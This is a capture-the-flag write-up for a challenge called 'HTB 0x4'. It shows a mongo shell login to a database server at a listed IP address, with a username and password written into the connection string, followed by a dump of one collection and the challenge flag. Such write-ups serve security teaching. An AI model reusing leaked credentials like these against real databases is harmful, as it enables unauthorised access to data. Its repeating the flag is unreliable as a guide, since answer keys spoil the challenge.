# HTB 0x4

Author: [thebongy](https://github.com/thebongy) and [roerohan](https://github.com/roerohan)

## Description

Hackthebox challenge 4.

## Requirements

- Docker

## Sources

```
Server is at 34.93.215.188.
```

## Exploit

You will need the mongo connection string from [HTB 0x4](../HTB%200x4), then you can log in to the database and view documents in the `stuff` collection.

```bash
$ mongo mongodb://web:9EAC744765EA6F26@34.93.215.188:27017/HTBDB

> db.stuff.find({})
{ "_id" : ObjectId("5f159c81466eb801258dc20b"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c86466eb801258dc20c"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c97466eb801258dc20d"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c98466eb801258dc20e"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c99466eb801258dc20f"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9a466eb801258dc210"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9b466eb801258dc211"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9b466eb801258dc212"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9b466eb801258dc213"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9b466eb801258dc214"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9c466eb801258dc215"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9c466eb801258dc216"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9c466eb801258dc217"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9c466eb801258dc218"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159c9d466eb801258dc219"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159d26466eb801258dc21a"), "flag" : "csictf{m0ng0_c0llect10ns_yay}" }
{ "_id" : ObjectId("5f159d29466eb801258dc21b"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159d2b466eb801258dc21c"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159d2d466eb801258dc21d"), "flag" : "blaakdjdoifjadf" }
{ "_id" : ObjectId("5f159d2e466eb801258dc21e"), "flag" : "blaakdjdoifjadf" }
Type "it" for more
```

You can see the flag in a documents.
<br />

The flag is:

```
csictf{m0ng0_c0llect10ns_yay}
```